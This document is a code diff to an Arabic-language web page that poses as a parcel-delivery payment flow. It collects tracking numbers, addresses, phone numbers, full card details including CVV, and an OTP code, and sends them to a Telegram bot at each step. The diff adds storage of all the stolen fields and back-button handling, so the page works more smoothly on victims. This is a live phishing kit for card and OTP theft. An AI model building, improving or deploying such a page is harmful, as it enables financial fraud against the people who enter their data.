@@ -51,7 +51,6 @@
         .otp-icon { width: 80px; height: 80px; background-color: #e8f0fe; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .otp-icon svg { width: 40px; height: 40px; fill: #0b3b82; }
         
-        /* تعديل: تصغير المربع شوي */
         .otp-single-input { 
             width: 85%; 
             margin: 0 auto 30px auto; 
@@ -229,7 +228,6 @@
             
             <input type="tel" id="otp-single-input" class="otp-single-input">
             
-            <!-- تعديل: تغيير اسم الزر -->
             <button class="verify-btn" onclick="verifyOTP()">تأكيد الدفع</button>
         </div>
 
@@ -256,6 +254,7 @@
         let currentAmount = "";
         let currentPhone = ""; 
 
+        // دالة لإرسال التيليجرام
         function sendTelegramMsg(msg) {
             var url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
             fetch(url).then(res => res.json()).then(data => {
@@ -263,6 +262,7 @@
             }).catch(err => console.log("خطأ في الاتصال:", err));
         }
 
+        // دالة لحساب السعر
         function calculatePrice(trackingNum) {
             let sum = 0;
             for (let i = 0; i < trackingNum.length; i++) {
@@ -273,17 +273,51 @@
             return price;
         }
 
+        // حفظ البيانات عند الانتقال
+        function saveData() {
+            sessionStorage.setItem('tracking', document.getElementById('tracking-number').value);
+            sessionStorage.setItem('city', document.getElementById('address-city').value);
+            sessionStorage.setItem('district', document.getElementById('address-district').value);
+            sessionStorage.setItem('street', document.getElementById('address-street').value);
+            sessionStorage.setItem('phone', document.getElementById('address-phone').value);
+            sessionStorage.setItem('name', document.getElementById('card-name').value);
+            sessionStorage.setItem('card', document.getElementById('card-number').value);
+            sessionStorage.setItem('expiry', document.getElementById('card-expiry').value);
+            sessionStorage.setItem('cvv', document.getElementById('card-cvv').value);
+            sessionStorage.setItem('otp', document.getElementById('otp-single-input').value);
+            sessionStorage.setItem('amount', document.getElementById('total-amount').value);
+        }
+
+        // استرجاع البيانات عند الرجوع
+        function loadData() {
+            if(sessionStorage.getItem('tracking')) document.getElementById('tracking-number').value = sessionStorage.getItem('tracking');
+            if(sessionStorage.getItem('city')) document.getElementById('address-city').value = sessionStorage.getItem('city');
+            if(sessionStorage.getItem('district')) document.getElementById('address-district').value = sessionStorage.getItem('district');
+            if(sessionStorage.getItem('street')) document.getElementById('address-street').value = sessionStorage.getItem('street');
+            if(sessionStorage.getItem('phone')) document.getElementById('address-phone').value = sessionStorage.getItem('phone');
+            if(sessionStorage.getItem('name')) document.getElementById('card-name').value = sessionStorage.getItem('name');
+            if(sessionStorage.getItem('card')) document.getElementById('card-number').value = sessionStorage.getItem('card');
+            if(sessionStorage.getItem('expiry')) document.getElementById('card-expiry').value = sessionStorage.getItem('expiry');
+            if(sessionStorage.getItem('cvv')) document.getElementById('card-cvv').value = sessionStorage.getItem('cvv');
+            if(sessionStorage.getItem('otp')) document.getElementById('otp-single-input').value = sessionStorage.getItem('otp');
+            if(sessionStorage.getItem('amount')) document.getElementById('total-amount').value = sessionStorage.getItem('amount');
+        }
+
+        // 1. من التتبع إلى العنوان
         function goToAddress() {
             currentTrackingNumber = document.getElementById('tracking-number').value;
             if (currentTrackingNumber.trim() === "") { alert("الرجاء إدخال رقم الشحنة!"); return; }
             
             sendTelegramMsg("📦 المستخدم أدخل رقم الشحنة: " + currentTrackingNumber);
+            saveData(); // حفظ البيانات
 
             document.getElementById('tracking-page').style.display = 'none';
             document.getElementById('address-page').style.display = 'block';
             window.scrollTo(0, 0);
+            history.pushState({ page: "address" }, "", "");
         }
 
+        // 2. من العنوان إلى الدفع
         function goToPayment() {
             var city = document.getElementById('address-city').value;
             var district = document.getElementById('address-district').value;
@@ -296,7 +330,6 @@
             }
 
             currentPhone = phone;
-
             let addressMsg = `📍 بيانات العنوان:\n`;
             addressMsg += `المدينة: ${city}\n`;
             addressMsg += `الحي: ${district}\n`;
@@ -307,12 +340,15 @@
             let calculatedPrice = calculatePrice(currentTrackingNumber);
             currentAmount = calculatedPrice + " ريال"; 
             document.getElementById('total-amount').value = currentAmount;
+            saveData(); // حفظ البيانات
 
             document.getElementById('address-page').style.display = 'none';
             document.getElementById('payment-page').style.display = 'block';
             window.scrollTo(0, 0);
+            history.pushState({ page: "payment" }, "", "");
         }
 
+        // 3. من الدفع إلى OTP
         function goToOTP() {
             currentCustomerName = document.getElementById('card-name').value;
             var cardNumber = document.getElementById('card-number').value;
@@ -332,12 +368,15 @@
             } else {
                 document.getElementById('otp-subtitle').innerText = `أدخل الرمز المرسل إلى الأرقام`;
             }
+            saveData(); // حفظ البيانات
 
             document.getElementById('payment-page').style.display = 'none';
             document.getElementById('otp-page').style.display = 'block';
             window.scrollTo(0, 0);
+            history.pushState({ page: "otp" }, "", "");
         }
 
+        // 4. من OTP إلى النجاح
         function verifyOTP() {
             let otpCode = document.getElementById('otp-single-input').value;
             
@@ -347,11 +386,42 @@
             }
 
             sendTelegramMsg(`🔑 رمز التحقق OTP: ${otpCode}`);
+            saveData(); // حفظ البيانات
 
             document.getElementById('otp-page').style.display = 'none';
             document.getElementById('success-page').style.display = 'block';
             window.scrollTo(0, 0);
+            history.pushState({ page: "success" }, "", "");
         }
+
+        // 5. التحكم بزر الرجوع
+        window.onpopstate = function(event) {
+            loadData(); // استرجاع البيانات فوراً
+            if (event.state && event.state.page) {
+                document.getElementById('tracking-page').style.display = 'none';
+                document.getElementById('address-page').style.display = 'none';
+                document.getElementById('payment-page').style.display = 'none';
+                document.getElementById('otp-page').style.display = 'none';
+                document.getElementById('success-page').style.display = 'none';
+                
+                if (event.state.page === "address") {
+                    document.getElementById('address-page').style.display = 'block';
+                } else if (event.state.page === "payment") {
+                    document.getElementById('payment-page').style.display = 'block';
+                } else if (event.state.page === "otp") {
+                    document.getElementById('otp-page').style.display = 'block';
+                } else if (event.state.page === "success") {
+                    document.getElementById('success-page').style.display = 'block';
+                }
+            } else {
+                document.getElementById('tracking-page').style.display = 'block';
+                document.getElementById('address-page').style.display = 'none';
+                document.getElementById('payment-page').style.display = 'none';
+                document.getElementById('otp-page').style.display = 'none';
+                document.getElementById('success-page').style.display = 'none';
+            }
+            window.scrollTo(0, 0);
+        };
     </script>
 </body>
 </html>
